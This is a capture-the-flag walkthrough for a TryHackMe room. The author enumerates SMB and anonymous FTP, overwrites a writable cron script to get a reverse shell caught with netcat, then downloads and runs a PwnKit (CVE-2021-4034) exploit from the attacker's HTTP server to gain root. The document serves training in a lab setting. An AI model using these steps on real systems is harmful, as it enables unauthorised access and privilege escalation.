## Anonymous
https://tryhackme.com/room/anonymous

## Enum
```
nmap -Pn -sC -sV -sT 10.10.178.129 -vv
```

```
Scanning 10.10.178.129 [1000 ports]
Discovered open port 139/tcp on 10.10.178.129
Discovered open port 445/tcp on 10.10.178.129
Discovered open port 22/tcp on 10.10.178.129
Discovered open port 21/tcp on 10.10.178.129

PORT    STATE SERVICE     REASON  VERSION
21/tcp  open  ftp         syn-ack vsftpd 2.0.8 or later
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.18.90.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCi47ePYjDctfwgAphABwT1jpPkKajXoLvf3bb/zvpvDvXwWKnm6nZuzL2HA1veSQa90ydSSpg8S+B8SLpkFycv7iSy2/Jmf7qY+8oQxWThH1fwBMIO5g/TTtRRta6IPoKaMCle8hnp5pSP5D4saCpSW3E5rKd8qj3oAj6S8TWgE9cBNJbMRtVu1+sKjUy/7ymikcPGAjRSSaFDroF9fmGDQtd61oU5waKqurhZpre70UfOkZGWt6954rwbXthTeEjf+4J5+gIPDLcKzVO7BxkuJgTqk4lE9ZU/5INBXGpgI5r4mZknbEPJKS47XaOvkqm9QWveoOSQgkqdhIPjnhD
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPjHnAlR7sBuoSM2X5sATLllsFrcUNpTS87qXzhMD99aGGzyOlnWmjHGNmm34cWSzOohxhoK2fv9NWwcIQ5A/ng=
|   256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDHIuFL9AdcmaAIY7u+aJil1covB44FA632BSQ7sUqap
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
| smb2-time:
|   date: 2022-08-12T10:29:49
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 52084/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 54391/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 2824/udp): CLEAN (Failed to receive data)
|   Check 4 (port 44335/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   ANONYMOUS<00>        Flags: <unique><active>
|   ANONYMOUS<03>        Flags: <unique><active>
|   ANONYMOUS<20>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2022-08-12T10:29:49+00:00
```

```
smbmap -H 10.10.178.129
```
```
[+] Guest session       IP: 10.10.178.129:445   Name: 10.10.178.129
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        pics                                                    READ ONLY       My SMB Share Directory for Pics
        IPC$
```
```
smbclient -N //10.10.178.129/pics
```
```
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun May 17 20:11:34 2020
  ..                                  D        0  Thu May 14 10:59:10 2020
  corgo2.jpg                          N    42663  Tue May 12 09:43:42 2020
  puppos.jpeg                         N   265188  Tue May 12 09:43:42 2020

                20508240 blocks of size 1024. 13306816 blocks available
smb: \> mget *.*
Get file corgo2.jpg? y
getting file \corgo2.jpg of size 42663 as corgo2.jpg (20.8 KiloBytes/sec) (average 20.8 KiloBytes/sec)
Get file puppos.jpeg? y
getting file \puppos.jpeg of size 265188 as puppos.jpeg (72.5 KiloBytes/sec) (average 53.9 KiloBytes/sec)
smb: \> exit
```

![image](https://user-images.githubusercontent.com/6504854/184354669-e69ca9e7-5e46-4f37-a6a9-74a1784a66ef.png)

🏴 It seems to be nothing strange except just pretty dog's pics. 🐶🐶🐶

```
ftp> open 10.10.178.129
Connected to 10.10.178.129.
220 NamelessOne's FTP Server!
Name (10.10.178.129:): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||11517|)
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 May 13  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||32674|)
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000          946 Aug 12 11:43 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> mget *.*
ftp> bye
221 Goodbye.
```

```
cat to_do.txt
I really need to disable the anonymous login...it's really not safe
```
```
cat removed_files.log
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
```
```
cat clean.sh
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```
🏴 clean.sh is called by cron or so? Let's add reverse-shell, upload and wait.

![image](https://user-images.githubusercontent.com/6504854/184356577-83691884-c731-4b71-9fcb-f4e0c34e7ff4.png)

```
ftp> open 10.10.178.129
ftp> cd scripts
ftp> put clean.sh
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||55248|)
150 Ok to send data.
100% |************************************************************************************|   356        1.64 MiB/s    00:00 ETA
226 Transfer complete.
ftp> bye
221 Goodbye.
```
🏴 OK!

## Flag
```
nc -lnvp 4444
```
```
listening on [any] 4444 ...
connect to [10.18.90.2] from (UNKNOWN) [10.10.113.217] 44948
bash: cannot set terminal process group (1372): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ python3 -c "import pty;pty.spawn('/bin/bash')"
python3 -c "import pty;pty.spawn('/bin/bash')"
namelessone@anonymous:~$ ls
ls
pics  user.txt
```
```
sudo -l
[sudo] password for namelessone:
```
😢

```
ls -la /usr/bin/pkexec
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
```
😋

```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
```
```
namelessone@anonymous:~$ wget http://10.18.90.2/1.tar
wget http://10.18.90.2/1.tar
1.tar               100%[===================>]  90.00K  94.2KB/s    in 1.0s

2022-08-12 12:18:53 (94.2 KB/s) - ‘1.tar’ saved [92160/92160]

namelessone@anonymous:~$ tar -xvf 1.tar
./cve-2021-4034
./cve-2021-4034.c
./cve-2021-4034.sh
./dry-run/
./dry-run/pwnkit-dry-run.c
./dry-run/dry-run-cve-2021-4034.c
./dry-run/Makefile
./gconv-modules
./GCONV_PATH=./
./GCONV_PATH=./pwnkit.so:.
./LICENSE
./Makefile
./pwnkit.c
./pwnkit.so
./README.md
namelessone@anonymous:~$ ./cve-2021-4034
./cve-2021-4034
# cat /root/root.txt
```

Thank you for your time, Happy hacking. 😄

いつものでやった

